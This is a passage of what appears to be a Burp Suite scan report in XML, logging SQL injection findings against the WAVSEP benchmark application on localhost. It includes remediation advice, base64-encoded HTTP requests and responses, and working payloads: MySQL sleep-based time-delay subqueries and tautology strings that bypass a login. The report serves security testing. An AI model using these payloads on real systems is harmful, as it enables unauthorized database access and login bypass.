application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application timed out when responding to the request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBJZGVudGljYWwvQ2FzZTA2LUluamVjdGlvbkluVXBkYXRlLURhdGUtVGltZURlbGF5RXhwbG9pdC0yMDBJZGVudGljYWwuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAyNg0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwSWRlbnRpY2FsL0Nhc2UwNi1JbmplY3Rpb25JblVwZGF0ZS1EYXRlLVRpbWVEZWxheUV4cGxvaXQtMjAwSWRlbnRpY2FsLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KdHJhbnNhY3Rpb25EYXRlPTIwMTAtMDItMDInJTJiKHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEpJTJiJw==]]></request>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8600120389122383872</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case07-InjectionInUpdate-NumericWithoutQuotes-TimeDelayExploit-200Identical.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Identical/Case07-InjectionInUpdate-NumericWithoutQuotes-TimeDelayExploit-200Identical.jsp [transactionId parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionId</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the transactionId parameter. The application timed out when responding to the request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBJZGVudGljYWwvQ2FzZTA3LUluamVjdGlvbkluVXBkYXRlLU51bWVyaWNXaXRob3V0UXVvdGVzLVRpbWVEZWxheUV4cGxvaXQtMjAwSWRlbnRpY2FsLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMTcNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMElkZW50aWNhbC9DYXNlMDctSW5qZWN0aW9uSW5VcGRhdGUtTnVtZXJpY1dpdGhvdXRRdW90ZXMtVGltZURlbGF5RXhwbG9pdC0yMDBJZGVudGljYWwuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9RTQ0QUE1NjNDNEVCRTQwRDcyNjg5OTY1NUI2MEFCMTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbklkPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>9222164777645015040</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp [password parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>password</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>42934706' or '5519'='5519</b> and <b>24467078' or '7883'='7890</b> were each submitted in the password parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the password parameter. The application took <b>20019</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkNDI5MzQ3MDYnJTIwb3IlMjAnNTUxOSclM2QnNTUxOSZ1c2VybmFtZT11c2VybmFtZQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQyOjQ2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzcNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpoZWxsbyB1c2VyMQoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkMjQ0NjcwNzgnJTIwb3IlMjAnNzg4MyclM2QnNzg5MCZ1c2VybmFtZT11c2VybmFtZQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQyOjQ2IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzgNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDM1DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMDEtSW5qZWN0aW9uSW5Mb2dpbi1TdHJpbmctTG9naW5CeXBhc3MtV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnBhc3N3b3JkPXBhc3N3b3JkJyUyYihzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKSUyYicmdXNlcm5hbWU9dXNlcm5hbWU=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQxOjQ1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzMzgNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMSAtIEluamVjdGlvbiBpbnRvIHN0cmluZyB2YWx1ZXMgaW4gYSBsb2dpbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlczwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+Cgpsb2dpbiBmYWlsZWQKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8979593318131524608</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case01-InjectionInLogin-String-LoginBypass-WithDifferent200Responses.jsp [username parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
